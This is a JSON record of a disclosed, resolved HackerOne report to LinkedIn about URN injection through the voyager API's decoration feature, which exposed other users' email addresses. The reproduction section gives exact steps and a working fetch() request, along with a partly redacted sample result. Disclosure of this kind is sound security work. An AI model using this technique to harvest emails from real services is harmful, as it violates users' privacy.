{
  "id": 1806939,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA2OTM5",
  "url": "https://hackerone.com/reports/1806939",
  "title": "Entire database of emails exposed through URN injection",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2022-12-15T16:23:54.284Z",
  "submitted_at": "2022-12-15T16:23:54.456Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "ultrapowa",
    "url": "/ultrapowa",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/qifrkdmp1mky5smlu2rf1sryvvbc/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 58,
    "url": "https://hackerone.com/linkedin",
    "handle": "linkedin",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/058/3aaa858b18e9807c5c1fea0c559156568a6647cc_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/058/3aaa858b18e9807c5c1fea0c559156568a6647cc_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "LinkedIn",
      "twitter_handle": "",
      "website": "https://www.linkedin.com",
      "about": "The world's largest professional network."
    }
  },
  "has_bounty?": true,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2023-05-22T21:25:37.393Z",
  "bug_reporter_agreed_on_going_public_at": "2023-05-17T09:27:50.899Z",
  "team_member_agreed_on_going_public_at": "2023-05-22T21:25:37.223Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hello LinkedIn,\n\n1. Situation\n\n- The [decoration](https://learn.microsoft.com/en-us/linkedin/shared/api-guide/concepts/decoration?context=linkedin%2Fcontext) feature available to anyone on voyager API allows expanding URN fields.\n- The query engine does not check whether a field should be expandable or not. Every field can be expanded.\n- It is possible to trigger a URN resolution by assigning an URN value to a text field inside a profile and using a decoration expansion in a voyager query.\n- Assigning a text field to `urn:li:fs_emailAddress:[email_id]` and triggering a URN resolution allows an attacker to retrieve the email.\n- Email ids are generated sequentially or pseudo-sequentially, as a result the entire database of emails is exposed.\n\n2. Mitigation\n\nI suggest the following:\n- It should never be possible for a user to expand a field, unless said field is explicitly allowed to be expanded (good luck with that considering the model size lol)\n- There should be an access check on email data accessible through URN resolution\n\n3. Reproduce\n\n- Authenticate to linkedin.com\n- Edit your profile, go to contact info, add a website and set the following URL value `urn:li:fs_emailAddress:8519272224`\n- Open Chrome console and run the following code after editing the identity param and the csrf token:\n```js\nawait (await fetch(\"https://www.linkedin.com/voyager/api/identity/dash/profiles?decoration=%28websites*%28url~%29%29&memberIdentity=[public identifier]&q=memberIdentity\", {\n  \"headers\": {\n    \"accept\": \"application/vnd.linkedin.normalized+json+2.1\",\n    \"accept-language\": \"en-US,en;q=0.9\",\n    \"csrf-token\": \"ajax:[your token here]\",\n    \"x-li-deco-include-micro-schema\": \"true\",\n    \"x-li-lang\": \"en_US\",\n    \"x-restli-protocol-version\": \"2.0.0\"\n  },\n  \"method\": \"GET\",\n  \"mode\": \"cors\",\n  \"credentials\": \"include\"\n})).json()\n```\n\nResult:\n```js\n{\n    \"data\": {\n        // ...\n    },\n    \"included\": [\n        {\n            \"entityUrn\": \"urn:li:fs_emailAddress:8519272224\",\n            \"confirmed\": true,\n            \"email\": \"melaa[redacted]@gmail.com\",\n            \"$type\": \"com.linkedin.voyager.identity.normalizedprofile.EmailAddress\",\n            \"primary\": null\n        }\n    ]\n}\n```\n\n## Impact\n\nWhat I'm showing here is a simple showcase attack.\nAn elaborated attack involving arrays and multiple accounts can probably retrieve millions of emails a day.",
  "weakness": {
    "id": 70,
    "name": "Code Injection"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 73,
  "voters": [
    "amr_id",
    "maskopatol",
    "shreyaschavhan",
    "sumzer0",
    "remy1",
    "n1m0",
    "zy9ard3",
    "20_root",
    "serverinspector",
    "headhunter",
    "and 63 more..."
  ],
  "severity": {
    "rating": "medium",
    "score": 5.3,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "none",
      "user_interaction": "none",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 61408,
    "asset_type": "URL",
    "asset_identifier": "www.linkedin.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
